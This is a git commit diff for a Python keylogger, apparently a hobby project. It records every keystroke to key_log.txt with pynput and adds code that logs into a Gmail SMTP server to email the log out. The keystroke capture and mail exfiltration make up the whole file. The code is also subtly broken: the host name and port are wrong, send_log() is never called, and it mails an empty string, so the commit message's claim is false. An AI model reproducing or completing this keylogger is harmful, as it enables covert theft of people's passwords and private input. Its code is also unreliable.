40c0b78b4c68d1fc6bb5ead596e5870aec2c33d5
Alfredo <76714792+aalejo92@users.noreply.github.com>
2021-06-03 21:30:32 -0400

    Update Keylogger.py
    06-03-21 - Added email feature that emails key_log.txt after closing/ending program

--- Keylogger.py
+++ Keylogger.py
@@ -1,17 +1,35 @@
-# A library I found that control and monitors input devices (mouse/keyboard input and monitoring)
 from pynput.keyboard import Key, Listener
 import logging
+import getpass  # Library that makes password non-visible and keeps hidden from being logged
+import smtplib  # Protocol library for email
 
-# Creates a file to save data
-log_dir = ""
+#
+email = input('Enter email: ')
+password = getpass.getpass(prompt='Password: ', stream=None)
+# Information required for email connection
+server = smtplib.SMTP_SSL('smt.gmail.com', 456)
+server.login(email, password)
 
-logging.basicConfig(filename=(log_dir + "key_log.txt"),
+key_log = ""
+
+logging.basicConfig(filename=(key_log + "key_log.txt"),
                     level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 
+# Function for recording keystrokes
 def on_press(key):
     logging.info(str(key))
+    # Use esc to exit loop
+    if key == Key.esc:
+        return False
 
 
+def send_log():
+    # Deliver as following (email you want to send to, email you want to send from, and item)
+    # want to send and receive to self as a way to test program
+    server.sendmail(email, email, key_log)
+
+
+# function that monitors keypress from pynput
 with Listener(on_press=on_press) as listener:
     listener.join()
